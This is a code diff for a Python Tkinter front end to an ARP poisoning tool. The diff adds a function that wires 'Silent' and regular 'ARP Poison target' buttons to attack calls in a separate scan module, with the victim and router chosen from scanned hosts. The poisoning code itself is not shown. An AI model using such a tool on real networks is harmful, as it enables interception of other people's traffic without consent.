@@ -7,6 +7,42 @@ import scan
 p_x = 10
 p_y = 10
 
+
+# Method for selecting the interface and then grabbing all devices active on that interface
+def select_interface(event="x"):
+    s = interface_combo.get()
+    s = s.split(', ')
+
+    # Grab the IP's and MAC addresses
+    found_ips = scan.scan(net=s[0], interface=s[1])
+    found_ips = [', '.join(i[::-1]) for i in found_ips]
+
+    # Set the found IP's, MAC addresses and make buttons available
+    router_combo['values'] = found_ips
+    router_combo.current(0)
+    router_combo['state'] = "normal"
+
+    targets_combo['values'] = found_ips
+    targets_combo.current(0)
+    targets_combo['state'] = "normal"
+    silent_button['state'] = "normal"
+    attack_button['state'] = "normal"
+
+
+# Does the ARP poisoning can either do silent or non-silent
+def poison(silent=False):
+    target = targets_combo.get()
+    router = router_combo.get()
+
+    target = target.split(', ')
+    router = router.split(', ')
+
+    if silent:
+        scan.arp_poison_stealthy(router_ip=router[0], router_mac=router[1], victim_ip=target[0], victim_mac=target[1])
+    else:
+        scan.arp_poison(router_ip=router[0], router_mac=router[1], victim_ip=target[0], victim_mac=target[1])
+
+
 # Make the basic TKinter gui
 window = Tk()
 # window.geometry('400x400')
@@ -22,24 +58,6 @@ interface_combo['values'] = scan.get_interfaces()
 interface_combo.current(0)
 interface_combo.grid(column=2, columnspan=2, row=0, padx=p_x)
 
-
-def select_interface(event="x"):
-    s = interface_combo.get()
-    s = s.split(', ')
-    found_ips = scan.scan(net=s[0], interface=s[1])
-    found_ips = [', '.join(i[::-1]) for i in found_ips]
-
-    router_combo['values'] = found_ips
-    router_combo.current(0)
-    router_combo['state'] = "normal"
-
-    targets_combo['values'] = found_ips
-    targets_combo.current(0)
-    targets_combo['state'] = "normal"
-    silent_button['state'] = "normal"
-    attack_button['state'] = "normal"
-
-
 # Add scan button
 scan_button = t.Button(text="Scan for interfaces", command=select_interface)
 scan_button.grid(column=3, row=2, padx=p_x, stick=E)
@@ -49,7 +67,7 @@ scan_button.grid(column=3, row=2, padx=p_x, stick=E)
 label_router = t.Label(window, text="Choose the router")
 label_router.grid(column=0, columnspan=2, row=3, stick=W, padx=p_x, pady=p_y)
 router_combo = t.Combobox(window, width=35, state="disabled")
-router_combo.grid(column=2,columnspan=2, row=3, padx=p_x)
+router_combo.grid(column=2, columnspan=2, row=3, padx=p_x)
 
 # Add label for victims
 label_victim = t.Label(window, text="Choose your victim")
@@ -57,16 +75,16 @@ label_victim.grid(column=0, columnspan=2, row=4, stick=W, padx=p_x, pady=p_y)
 targets_combo = t.Combobox(window, width=35, state="disabled")
 targets_combo.grid(column=2, columnspan=2, row=4, padx=p_x)
 
-silent_button = t.Button(window, text="Silent ARP Poison target", state=DISABLED, command=scan)
+# Add buttons for silent and non-silent poison
+silent_button = t.Button(window, text="Silent ARP Poison target", state=DISABLED, command=lambda: poison(silent=True))
 silent_button.grid(column=2, row=5, padx=p_x, pady=p_y)
 
-attack_button = t.Button(window, text="ARP Poison target", state=DISABLED, command=scan  )
+attack_button = t.Button(window, text="ARP Poison target", state=DISABLED, command=lambda: poison(silent=False))
 attack_button.grid(column=3, row=5, padx=p_x, pady=p_y)
 
 
 # Event watcher for when something in the combobox is selected
 # interface_combo.bind("<<ComboboxSelected>>", select_interface)
-
 
 # Run Gui
 window.mainloop()
